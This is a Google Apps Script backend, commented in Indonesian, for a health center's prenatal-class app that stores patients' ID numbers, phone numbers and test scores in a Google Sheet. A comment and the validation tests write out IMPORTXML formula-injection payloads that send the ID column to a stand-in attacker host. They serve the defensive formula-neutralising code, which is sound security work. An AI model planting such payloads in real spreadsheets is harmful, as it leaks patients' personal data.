/**
 * KIARA — Google Apps Script backend
 * Puskesmas Kecamatan Cakung
 *
 * STRUKTUR SHEET (satu sheet, 13 kolom) — disediakan puskesmas:
 *
 *   1  No
 *   2  Date              dd-mm-yyyy
 *   3  Time              HH:mm:ss
 *   4  Nama
 *   5  NIK               disimpan apa adanya (16 digit)
 *   6  No WA
 *   7  Alamat
 *   8  Kelurahan
 *   9  Puskesmas
 *   10 Kunjungan ke-     1..TOTAL_SESI
 *   11 Pre-Test          0..100
 *   12 Post-Test         0..100, percobaan terakhir
 *   13 Status            LULUS / BELUM  (Post-Test >= KKM)
 *
 * Satu baris = satu kunjungan. Satu pasien bisa punya beberapa baris.
 * Nomor kunjungan berikutnya dihitung dari baris ber-NIK sama yang
 * nilainya paling besar di kolom "Kunjungan ke-".
 *
 * Endpoint (semua GET berparameter — POST ke Web App kena redirect 302
 * yang bikin CORS gagal di browser):
 *   ?action=lookup&nik=3175...
 *   ?action=save&nik=...&nama=...&...
 *
 * CARA DEPLOY
 *   1. Buka spreadsheet yang sudah dibuat → Extensions → Apps Script
 *   2. Tempel seluruh isi file ini, Save
 *   3. Run → cekSheet (sekali, beri izin) untuk memastikan header terbaca
 *   4. Deploy → New deployment → Web app
 *        Execute as     : Me
 *        Who has access : Anyone
 *   5. Salin Web app URL ke SHEETS_ENDPOINT di config.js
 *
 * Setiap file ini diubah: Deploy → Manage deployments → Edit → New version.
 *
 * ⚠️ PRIVASI — NIK disimpan mentah sesuai struktur yang diminta. Google
 *    Sheets hanya punya kontrol akses per-file dan tidak punya audit log
 *    yang layak. Bagikan spreadsheet ini HANYA ke akun bidan tertentu,
 *    jangan pernah pakai opsi "anyone with the link".
 *
 * ⚠️ URL Web App ini memberi akses TULIS ke sheet bagi siapa pun yang
 *    memilikinya, dan pada aplikasi statis URL selalu terlihat di DevTools.
 *    Repo aplikasinya publik, jadi URL bisa ditemukan pemindai otomatis.
 *    Selama masa uji risiko ini diterima, tapi SEBELUM dipakai pasien nyata:
 *      Deploy → Manage deployments → Edit → New version  (URL berubah)
 *    atau jadikan repo private.
 *
 *    Yang sudah dipasang sebagai peredam: validasi ketat per field
 *    (validasiSimpan), clamp KKM & jumlah sesi, pembatas laju penulisan
 *    (lolosThrottle), dan penetral injeksi formula Sheets (amanTeks).
 *    Jalankan ujiValidasi() untuk memastikan semuanya aktif.
 */

/* Kolom (1-based) — supaya tidak ada angka ajaib berserakan. */
var K = {
  NO: 1, TANGGAL: 2, JAM: 3, NAMA: 4, NIK: 5, WA: 6, ALAMAT: 7,
  KELURAHAN: 8, PUSKESMAS: 9, KUNJUNGAN: 10, PRE: 11, POST: 12, STATUS: 13
};
var JML_KOLOM = 13;

/* Nama tab di spreadsheet "Rekap Hasil Kiara 2026".
   Dipatok, bukan memakai "sheet pertama", supaya menambah tab REKAP atau
   tab lain di sebelah kiri tidak membuat data masuk ke tab yang salah.
   Kosongkan ('') kalau ingin kembali memakai sheet pertama. */
var NAMA_SHEET = 'KIARA';

/* Header yang diharapkan di baris 1, urut kolom A–M. */
var HEADER_HARAPAN = [
  'No', 'Date', 'Time', 'Nama', 'NIK', 'No WA', 'Alamat',
  'Kelurahan', 'Puskesmas', 'Kunjungan ke-', 'Pre-Test', 'Post-Test', 'Status'
];

/* ══════════════════════════════════════════════════════════
   ATURAN VALIDASI

   Endpoint ini terbuka untuk siapa pun yang memiliki URL-nya, dan pada
   aplikasi statis URL selalu terlihat di DevTools. Jadi endpoint tidak
   boleh mempercayai apa pun yang dikirim klien.

   Yang dijaga:
   - bentuk setiap field (panjang, pola, rentang)
   - kelurahan & puskesmas harus dari daftar resmi, bukan teks bebas
   - KKM dan jumlah sesi tidak boleh ditentukan sepenuhnya oleh klien
   - teks bebas dinetralkan dari injeksi formula Sheets
   - laju penulisan dibatasi supaya tidak bisa dibanjiri
   ══════════════════════════════════════════════════════════ */

var BATAS = {
  NAMA_MIN: 3,      NAMA_MAKS: 80,
  ALAMAT_MIN: 5,    ALAMAT_MAKS: 200,
  KKM_MIN: 50,      KKM_MAKS: 100,   KKM_DEFAULT: 75,
  SESI_MAKS: 10,    SESI_DEFAULT: 4,
  POIN_PER_SOAL: 10,                  // skor selalu kelipatan 10
  SIMPAN_PER_JENDELA: 40,             // kapasitas nyata ~40 pasien/hari
  JENDELA_MENIT: 10
};

/* Harus sama dengan KELURAHAN dan PUSKESMAS di config.js. */
var KELURAHAN_SAH = [
  'Jatinegara', 'Rawa Terate', 'Pulo Gebang', 'Cakung Timur',
  'Cakung Barat', 'Ujung Menteng', 'Penggilingan PIK', 'Penggilingan Elok'
];

var PUSKESMAS_SAH = [
  'Puskesmas Cakung', 'Pustu Jatinegara', 'Pustu Cakung Barat',
  'Pustu Pulo Gebang', 'Pustu Penggilingan PIK', 'Pustu Penggilingan Elok',
  'Pustu Rawa Terate', 'Pustu Ujung Menteng', 'Pustu Cakung Timur'
];

/* ══════════════════════════════════════════════════════════
   VALIDASI
   ══════════════════════════════════════════════════════════ */

/**
 * Netralkan teks bebas dari injeksi formula Sheets.
 *
 * Sel yang isinya diawali = + - @ (atau tab/CR) akan dieksekusi Sheets
 * sebagai formula begitu bidan membuka spreadsheet. Payload seperti
 *   =IMPORTXML("https://server-penyerang/?d="&CONCATENATE(E2:E50);"//a")
 * di kolom Nama bisa mengirim seluruh kolom NIK keluar tanpa perlu
 * menembus apa pun — cukup mengisi form. Prefiks apostrof memaksa
 * Sheets memperlakukan isinya sebagai teks biasa.
 */
function amanTeks(v) {
  var s = String(v == null ? '' : v).trim();
  if (!s) return '';
  return /^[=+\-@\t\r\n]/.test(s) ? "'" + s : s;
}

/** Buang apostrof pengaman saat nilai dibaca kembali untuk aplikasi. */
function tanpaApostrof(v) {
  return String(v == null ? '' : v).replace(/^'/, '');
}

/** Angka dalam rentang, atau nilai bawaan kalau klien mengirim yang aneh. */
function dalamRentang(v, min, maks, bawaan) {
  var n = Number(v);
  return (isFinite(n) && n >= min && n <= maks) ? n : bawaan;
}

function anggotaDaftar(v, daftar) {
  var s = String(v == null ? '' : v).trim();
  for (var i = 0; i < daftar.length; i++) if (daftar[i] === s) return true;
  return false;
}

/** Bilangan bulat dalam rentang. */
function bulatDi(v, min, maks) {
  var n = Number(v);
  return isFinite(n) && n === Math.floor(n) && n >= min && n <= maks;
}

/**
 * Periksa seluruh field sebelum apa pun ditulis.
 *
 * @returns {string} '' kalau lolos, atau alasan penolakan
 */
function validasiSimpan(p) {
  var nik = bersihNik(p.nik);
  if (nik.length !== 16) return 'NIK harus 16 digit angka';

  var nama = String(p.nama == null ? '' : p.nama).trim();
  if (nama.length < BATAS.NAMA_MIN || nama.length > BATAS.NAMA_MAKS) {
    return 'Nama harus ' + BATAS.NAMA_MIN + '–' + BATAS.NAMA_MAKS + ' karakter';
  }
  // Nama orang tidak pernah mengandung tag HTML atau URL.
  if (/[<>]|https?:\/\//i.test(nama)) return 'Nama mengandung karakter yang tidak diizinkan';

  var noHp = String(p.noHp == null ? '' : p.noHp).replace(/[\s\-']/g, '');
  if (!/^0\d{8,14}$/.test(noHp)) return 'No WA harus diawali 0 dan berisi 9–15 digit';

  var alamat = String(p.alamat == null ? '' : p.alamat).trim();
  if (alamat.length < BATAS.ALAMAT_MIN || alamat.length > BATAS.ALAMAT_MAKS) {
    return 'Alamat harus ' + BATAS.ALAMAT_MIN + '–' + BATAS.ALAMAT_MAKS + ' karakter';
  }
  if (/[<>]|https?:\/\//i.test(alamat)) return 'Alamat mengandung karakter yang tidak diizinkan';

  // Dua field ini datang dari dropdown tertutup di aplikasi. Kalau isinya
  // di luar daftar, berarti request tidak berasal dari aplikasi.
  if (!anggotaDaftar(p.kelurahan, KELURAHAN_SAH)) return 'Kelurahan tidak dikenal';
  if (!anggotaDaftar(p.puskesmas, PUSKESMAS_SAH)) return 'Puskesmas tidak dikenal';

  if (!bulatDi(p.kunjunganKe, 1, BATAS.SESI_MAKS)) {
    return 'Kunjungan ke- harus 1–' + BATAS.SESI_MAKS;
  }

  // Soal Benar/Salah 10 butir × 10 poin, jadi skor selalu kelipatan 10.
  // Nilai seperti 77 tidak mungkin berasal dari aplikasi.
  var skor = [['Pre-Test', p.skorPre], ['Post-Test', p.skorPost]];
  for (var i = 0; i < skor.length; i++) {
    var v = Number(skor[i][1] == null || skor[i][1] === '' ? 0 : skor[i][1]);
    if (!bulatDi(v, 0, 100)) return skor[i][0] + ' harus 0–100';
    if (v % BATAS.POIN_PER_SOAL !== 0) {
      return skor[i][0] + ' harus kelipatan ' + BATAS.POIN_PER_SOAL;
    }
  }

  return '';
}

/**
 * Pembatas laju penulisan.
 *
 * Endpoint terbuka, jadi tanpa ini satu skrip bisa membanjiri sheet
 * sampai ribuan baris dalam semenit. Kapasitas nyata kelas ibu hamil
 * jauh di bawah batas ini, jadi pasien asli tidak akan pernah kena.
 */
function lolosThrottle() {
  var props = PropertiesService.getScriptProperties();
  var sekarang = new Date().getTime();
  var jendelaMs = BATAS.JENDELA_MENIT * 60 * 1000;
  var mulai = Number(props.getProperty('throttleMulai')) || 0;
  var hitung = Number(props.getProperty('throttleHitung')) || 0;

  if (!mulai || sekarang - mulai > jendelaMs) {
    props.setProperties({ throttleMulai: String(sekarang), throttleHitung: '1' });
    return true;
  }
  if (hitung >= BATAS.SIMPAN_PER_JENDELA) return false;
  props.setProperty('throttleHitung', String(hitung + 1));
  return true;
}

/* ══════════════════════════════════════════════════════════
   ENTRY POINT
   ══════════════════════════════════════════════════════════ */

function doGet(e) {
  try {
    var p = (e && e.parameter) || {};
    var action = p.action || '';

    if (action === 'lookup') return json(handleLookup(p));
    if (action === 'save') return json(handleSave(p));

    // versi dinaikkan setiap file ini berubah — dipakai untuk memastikan
    // deployment yang aktif benar-benar versi terbaru.
    return json({ ok: true, message: 'KIARA endpoint aktif', versi: 4, kolom: JML_KOLOM });
  } catch (err) {
    return json({ ok: false, error: String(err && err.message ? err.message : err) });
  }
}

function doPost(e) {
  return doGet(e);
}

/* ══════════════════════════════════════════════════════════
   SHEET
   ══════════════════════════════════════════════════════════ */

function sheet() {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var sh = NAMA_SHEET ? ss.getSheetByName(NAMA_SHEET) : ss.getSheets()[0];
  if (!sh) throw new Error('Sheet tidak ditemukan: ' + NAMA_SHEET);
  return sh;
}

/** Samakan bentuk nama kolom: huruf kecil, buang spasi dan tanda baca. */
function kunciHeader(s) {
  return String(s == null ? '' : s).toLowerCase().replace(/[^a-z0-9]/g, '');
}

/**
 * Pastikan baris 1 benar-benar 13 kolom yang diharapkan.
 *
 * Ini penting karena kalau ada kolom disisipkan atau digeser di sheet,
 * tanpa pemeriksaan ini backend akan tetap menulis — masuk ke kolom yang
 * salah dan datanya berantakan tanpa ada yang sadar. Lebih baik gagal
 * dengan pesan jelas.
 *
 * @returns {string} '' kalau cocok, atau penjelasan ketidakcocokan
 */
function bedaHeader(sh) {
  var ada = sh.getRange(1, 1, 1, JML_KOLOM).getValues()[0];
  var salah = [];
  for (var i = 0; i < JML_KOLOM; i++) {
    if (kunciHeader(ada[i]) !== kunciHeader(HEADER_HARAPAN[i])) {
      salah.push('kolom ' + String.fromCharCode(65 + i) +
        ': harusnya "' + HEADER_HARAPAN[i] + '", terbaca "' + ada[i] + '"');
    }
  }
  return salah.join('; ');
}

/** Jalankan sekali dari editor untuk memastikan sheet dan header sudah benar. */
function cekSheet() {
  var sh = sheet();
  var header = sh.getRange(1, 1, 1, JML_KOLOM).getValues()[0];
  var beda = bedaHeader(sh);
  SpreadsheetApp.getUi().alert(
    'Spreadsheet : ' + SpreadsheetApp.getActiveSpreadsheet().getName() +
    '\nTab         : ' + sh.getName() +
    '\nBaris terisi: ' + sh.getLastRow() +
    '\n\nHeader terbaca:\n' + header.join(' | ') +
    '\n\n' + (beda ? 'TIDAK COCOK →\n' + beda.split('; ').join('\n') : 'Header sudah cocok.')
  );
}

/** Semua baris data (tanpa header). Array kosong kalau belum ada data. */
function ambilData(sh) {
  if (sh.getLastRow() < 2) return [];
  return sh.getRange(2, 1, sh.getLastRow() - 1, JML_KOLOM).getValues();
}

/* ══════════════════════════════════════════════════════════
   LOOKUP — dipakai screen S3 (Konfirmasi)
   ══════════════════════════════════════════════════════════ */

function handleLookup(p) {
  var nik = bersihNik(p.nik);
  if (!nik) return { ok: false, error: 'nik kosong' };

  var data = ambilData(sheet());
  var riwayat = [];

  for (var i = 0; i < data.length; i++) {
    if (bersihNik(data[i][K.NIK - 1]) !== nik) continue;
    riwayat.push({
      baris: i + 2,
      kunjunganKe: Number(data[i][K.KUNJUNGAN - 1]) || 0,
      tanggal: teksTanggal(data[i][K.TANGGAL - 1]),
      skorPre: Number(data[i][K.PRE - 1]),
      skorPost: Number(data[i][K.POST - 1]),
      statusKkm: String(data[i][K.STATUS - 1] || '').trim()
    });
  }

  if (!riwayat.length) return { ok: true, baru: true, kunjungan: 1, riwayat: [] };

  riwayat.sort(function (a, b) { return a.kunjunganKe - b.kunjunganKe; });
  var akhir = riwayat[riwayat.length - 1];
  var barisAkhir = data[akhir.baris - 2];

  // tanpaApostrof: amanTeks() bisa menambah prefiks ' pada teks bebas yang
  // berbahaya bagi Sheets. Prefiks itu urusan penyimpanan, jangan sampai
  // ikut muncul di form aplikasi.
  return {
    ok: true,
    baru: false,
    nama: tanpaApostrof(barisAkhir[K.NAMA - 1]),
    noHp: tanpaApostrof(barisAkhir[K.WA - 1]),
    alamat: tanpaApostrof(barisAkhir[K.ALAMAT - 1]),
    kelurahan: tanpaApostrof(barisAkhir[K.KELURAHAN - 1]),
    puskesmas: tanpaApostrof(barisAkhir[K.PUSKESMAS - 1]),
    // Nama field tetap kunjunganTerakhir supaya cocok dengan visit-tracker.js
    kunjunganTerakhir: akhir.kunjunganKe,
    tglKunjunganTerakhir: tanggalTerbaru(riwayat),
    status: akhir.kunjunganKe >=
      dalamRentang(p.totalSesi, 1, BATAS.SESI_MAKS, BATAS.SESI_DEFAULT)
      ? 'LULUS' : 'AKTIF',
    riwayat: riwayat,
    rataPost: rataPost(riwayat)
  };
}

/** Tanggal paling akhir dari seluruh riwayat, bukan sekadar kunjungan terbesar. */
function tanggalTerbaru(riwayat) {
  var maks = '';
  for (var i = 0; i < riwayat.length; i++) {
    var t = normalisasiIso(riwayat[i].tanggal);
    if (t > maks) maks = t;
  }
  return maks;
}

/* ══════════════════════════════════════════════════════════
   SAVE — tulis / perbarui satu kunjungan
   ══════════════════════════════════════════════════════════ */

function handleSave(p) {
  // Validasi dulu — murni hitungan, tidak menyentuh sheet. Request yang
  // ditolak di sini tidak perlu ikut berebut lock.
  var salah = validasiSimpan(p);
  if (salah) return { ok: false, error: salah };

  var nik = bersihNik(p.nik);
  var kunjungan = Number(p.kunjunganKe);

  // Kunci supaya dua pasien yang submit bersamaan tidak menimpa baris.
  var lock = LockService.getScriptLock();
  if (!lock.tryLock(20000)) return { ok: false, error: 'Server sibuk, coba lagi' };

  try {
    var sh = sheet();

    // Jangan pernah menulis kalau susunan kolom tidak sesuai.
    var beda = bedaHeader(sh);
    if (beda) return { ok: false, error: 'Susunan kolom sheet tidak sesuai — ' + beda };

    // Di dalam lock supaya dua request bersamaan tidak sama-sama
    // membaca hitungan lama lalu menulisnya kembali.
    if (!lolosThrottle()) {
      return { ok: false, error: 'Terlalu banyak penyimpanan dalam ' +
        BATAS.JENDELA_MENIT + ' menit terakhir. Coba lagi sebentar.' };
    }

    var data = ambilData(sh);

    // KKM dan jumlah sesi tidak boleh ditentukan sepenuhnya oleh klien:
    // kkm=0 akan membuat semua orang LULUS. Nilai di luar rentang wajar
    // diabaikan, pakai bawaan.
    var kkm = dalamRentang(p.kkm, BATAS.KKM_MIN, BATAS.KKM_MAKS, BATAS.KKM_DEFAULT);
    var total = dalamRentang(p.totalSesi, 1, BATAS.SESI_MAKS, BATAS.SESI_DEFAULT);
    var pre = Number(p.skorPre) || 0;
    var post = Number(p.skorPost) || 0;
    var status = post >= kkm ? 'LULUS' : 'BELUM';
    var allowUpdate = String(p.allowUpdate) === '1';

    // Cari baris dengan NIK + nomor kunjungan yang sama.
    var barisAda = -1;
    for (var i = 0; i < data.length; i++) {
      if (bersihNik(data[i][K.NIK - 1]) === nik &&
          Number(data[i][K.KUNJUNGAN - 1]) === kunjungan) {
        barisAda = i + 2;
        break;
      }
    }

    if (barisAda > 0 && !allowUpdate) return { ok: false, error: 'DUPLIKAT' };

    if (barisAda > 0) {
      // Post-test diulang → perbarui nilai akhir, jangan tambah baris.
      sh.getRange(barisAda, K.POST).setValue(post);
      sh.getRange(barisAda, K.STATUS).setValue(status);
      sh.getRange(barisAda, K.JAM).setValue("'" + jamJakarta());
    } else {
      sh.appendRow([
        nomorBerikut(sh),
        "'" + tanggalJakarta(),
        "'" + jamJakarta(),
        amanTeks(p.nama),
        "'" + nik,
        "'" + String(p.noHp || '').replace(/[\s\-']/g, ''),
        amanTeks(p.alamat),
        amanTeks(p.kelurahan),
        amanTeks(p.puskesmas),
        kunjungan,
        pre,
        post,
        status
      ]);
    }

    var riwayat = handleLookup({ nik: nik, totalSesi: total }).riwayat || [];
    return {
      ok: true,
      statusKkm: status,
      delta: post - pre,
      rataPost: rataPost(riwayat),
      status: kunjungan >= total ? 'LULUS' : 'AKTIF'
    };
  } finally {
    lock.releaseLock();
  }
}

/** Nomor urut berikutnya di kolom "No". Dihitung dari nilai terbesar, bukan
    jumlah baris, supaya tetap benar kalau ada baris yang pernah dihapus. */
function nomorBerikut(sh) {
  var data = ambilData(sh);
  var maks = 0;
  for (var i = 0; i < data.length; i++) {
    var n = Number(data[i][K.NO - 1]);
    if (!isNaN(n) && n > maks) maks = n;
  }
  return maks + 1;
}

/* ══════════════════════════════════════════════════════════
   FUNGSI UJI — jalankan dari editor Apps Script

   Dipakai untuk memastikan sheet benar-benar bisa ditulis SEBELUM
   aplikasi disambungkan. Kalau ujiTulis() berhasil, berarti nama tab,
   susunan kolom, dan izin sudah benar — sisa masalah kalau ada pasti
   di sisi aplikasi, bukan di sheet.
   ══════════════════════════════════════════════════════════ */

var NIK_UJI = '9999999999999999';
var NAMA_UJI = 'UJI COBA - HAPUS';

/**
 * Tulis satu baris uji lewat jalur yang sama dengan aplikasi.
 * Sengaja memanggil handleSave(), bukan appendRow langsung, supaya
 * validasi header dan penguncian ikut teruji.
 */
function ujiTulis() {
  var hasil = handleSave({
    nik: NIK_UJI,
    nama: NAMA_UJI,
    noHp: '081200000000',
    alamat: 'Alamat uji coba',
    kelurahan: 'Pulo Gebang',
    puskesmas: 'Puskesmas Cakung',
    kunjunganKe: 1,
    skorPre: 40,
    skorPost: 90,
    kkm: 75,
    totalSesi: 4,
    allowUpdate: '1'
  });

  var sh = sheet();
  SpreadsheetApp.getUi().alert(
    hasil.ok
      ? 'BERHASIL — satu baris uji ditulis.\n\n' +
        'Tab          : ' + sh.getName() + '\n' +
        'Baris terisi : ' + sh.getLastRow() + '\n' +
        'Status       : ' + hasil.statusKkm + '\n' +
        'Rata-rata    : ' + hasil.rataPost + '\n\n' +
        'Periksa baris terakhir. Pastikan:\n' +
        '  • NIK utuh 16 digit (bukan 9,99999E+15)\n' +
        '  • No WA masih diawali 0\n' +
        '  • Tanggal berformat dd-mm-yyyy\n\n' +
        'Setelah itu jalankan hapusUji() untuk membersihkan.'
      : 'GAGAL — ' + hasil.error
  );
}

/** Uji baca: pastikan lookup menemukan baris uji dan menghitung sesi berikutnya. */
function ujiBaca() {
  var r = handleLookup({ nik: NIK_UJI, totalSesi: 4 });
  SpreadsheetApp.getUi().alert(
    'Hasil lookup NIK uji:\n\n' +
    'Ditemukan     : ' + (r.baru ? 'tidak (dianggap pasien baru)' : 'ya') + '\n' +
    'Nama          : ' + (r.nama || '-') + '\n' +
    'Sesi terakhir : ' + (r.kunjunganTerakhir || 0) + '\n' +
    'Tgl terakhir  : ' + (r.tglKunjunganTerakhir || '-') + '\n' +
    'Jumlah baris  : ' + ((r.riwayat || []).length) + '\n\n' +
    (r.baru
      ? 'Belum ada baris uji. Jalankan ujiTulis() dulu.'
      : 'Sesi berikutnya akan terdeteksi: ' + (r.kunjunganTerakhir + 1))
  );
}

/**
 * Uji validasi tanpa menulis apa pun ke sheet.
 *
 * Memanggil validasiSimpan() langsung, jadi aman dijalankan kapan saja.
 * Semua kasus buruk HARUS ditolak; kasus terakhir (payload asli) harus lolos.
 */
function ujiValidasi() {
  var dasar = {
    nik: NIK_UJI, nama: NAMA_UJI, noHp: '081200000000',
    alamat: 'Alamat uji coba', kelurahan: 'Pulo Gebang',
    puskesmas: 'Puskesmas Cakung', kunjunganKe: 1,
    skorPre: 40, skorPost: 90
  };

  function dengan(ubah) {
    var p = {}, k;
    for (k in dasar) if (dasar.hasOwnProperty(k)) p[k] = dasar[k];
    for (k in ubah) if (ubah.hasOwnProperty(k)) p[k] = ubah[k];
    return p;
  }

  // [nama kasus, payload, harus ditolak?]
  var kasus = [
    ['NIK 15 digit',          dengan({ nik: '317512345678901' }),   true],
    ['NIK berisi huruf',      dengan({ nik: '3175abc123456789' }),  true],
    ['Nama 2 karakter',       dengan({ nama: 'Ab' }),               true],
    ['Nama berisi tag HTML',  dengan({ nama: 'Ani <script>' }),     true],
    ['Nama formula IMPORTXML',dengan({ nama: '=IMPORTXML("http://x/?d="&E2,"//a")' }), true],
    ['No WA tanpa awalan 0',  dengan({ noHp: '81200000000' }),      true],
    ['No WA terlalu pendek',  dengan({ noHp: '0812' }),             true],
    ['Alamat 3 karakter',     dengan({ alamat: 'Jl.' }),            true],
    ['Kelurahan karangan',    dengan({ kelurahan: 'Kelurahan Palsu' }), true],
    ['Puskesmas karangan',    dengan({ puskesmas: 'Pustu Antah Berantah' }), true],
    ['Kunjungan 0',           dengan({ kunjunganKe: 0 }),           true],
    ['Kunjungan 99',          dengan({ kunjunganKe: 99 }),          true],
    ['Skor 77 (bukan x10)',   dengan({ skorPost: 77 }),             true],
    ['Skor 120',              dengan({ skorPost: 120 }),            true],
    ['Payload asli',          dengan({}),                           false]
  ];

  var baris = [], gagal = 0;
  for (var i = 0; i < kasus.length; i++) {
    var pesan = validasiSimpan(kasus[i][1]);
    var ditolak = pesan !== '';
    var benar = ditolak === kasus[i][2];
    if (!benar) gagal++;
    baris.push((benar ? '  OK  ' : ' SALAH') + ' │ ' + kasus[i][0] +
      (pesan ? ' → ' + pesan : ' → lolos'));
  }

  // Uji amanTeks terpisah — ini yang menahan injeksi formula.
  var contoh = '=IMPORTXML("http://x","//a")';
  var netral = amanTeks(contoh).charAt(0) === "'";

  SpreadsheetApp.getUi().alert(
    'UJI VALIDASI — ' + (kasus.length - gagal) + '/' + kasus.length + ' benar\n\n' +
    baris.join('\n') +
    '\n\nProteksi formula Sheets: ' + (netral ? 'AKTIF' : 'TIDAK AKTIF') +
    '\n  ' + contoh + '\n  → ' + amanTeks(contoh) +
    '\n\n' + (gagal === 0 && netral
      ? 'Semua aturan berjalan sesuai harapan.'
      : 'ADA YANG TIDAK SESUAI — periksa baris bertanda SALAH.')
  );
}

/** Hapus semua baris uji. Aman dijalankan berkali-kali. */
function hapusUji() {
  var sh = sheet();
  var data = ambilData(sh);
  var dihapus = 0;

  // Dari bawah ke atas supaya nomor baris tidak bergeser saat dihapus.
  for (var i = data.length - 1; i >= 0; i--) {
    var cocokNik = bersihNik(data[i][K.NIK - 1]) === NIK_UJI;
    var cocokNama = String(data[i][K.NAMA - 1]).trim().toUpperCase() === NAMA_UJI;
    if (cocokNik || cocokNama) {
      sh.deleteRow(i + 2);
      dihapus++;
    }
  }

  SpreadsheetApp.getUi().alert(
    dihapus
      ? dihapus + ' baris uji dihapus. Baris terisi sekarang: ' + sh.getLastRow()
      : 'Tidak ada baris uji yang ditemukan.'
  );
}

/* ══════════════════════════════════════════════════════════
   HELPER
   ══════════════════════════════════════════════════════════ */

/** Ambil hanya angka, buang apostrof dan spasi. */
function bersihNik(v) {
  return String(v == null ? '' : v).replace(/\D/g, '');
}

function rataPost(riwayat) {
  if (!riwayat || !riwayat.length) return 0;
  var jml = 0, n = 0;
  for (var i = 0; i < riwayat.length; i++) {
    var v = Number(riwayat[i].skorPost);
    if (!isNaN(v)) { jml += v; n++; }
  }
  return n ? Math.round(jml / n) : 0;
}

function jakarta() {
  return new Date(new Date().toLocaleString('en-US', { timeZone: 'Asia/Jakarta' }));
}

function pad2(n) {
  return String(n).length < 2 ? '0' + n : String(n);
}

/** dd-mm-yyyy — sesuai kolom Date di sheet. */
function tanggalJakarta() {
  var d = jakarta();
  return pad2(d.getDate()) + '-' + pad2(d.getMonth() + 1) + '-' + d.getFullYear();
}

function jamJakarta() {
  var d = jakarta();
  return pad2(d.getHours()) + ':' + pad2(d.getMinutes()) + ':' + pad2(d.getSeconds());
}

/** Bentuk tanggal dari sel Sheets → dd-mm-yyyy. */
function teksTanggal(v) {
  if (!v) return '';
  if (Object.prototype.toString.call(v) === '[object Date]') {
    return pad2(v.getDate()) + '-' + pad2(v.getMonth() + 1) + '-' + v.getFullYear();
  }
  return String(v).replace(/^'/, '').trim();
}

/** dd-mm-yyyy → yyyy-mm-dd, supaya bisa dibandingkan sebagai teks. */
function normalisasiIso(s) {
  var m = String(s).match(/^(\d{2})-(\d{2})-(\d{4})$/);
  if (m) return m[3] + '-' + m[2] + '-' + m[1];
  var n = String(s).match(/^(\d{4})-(\d{2})-(\d{2})/);
  return n ? n[0] : String(s);
}

function json(obj) {
  return ContentService
    .createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}
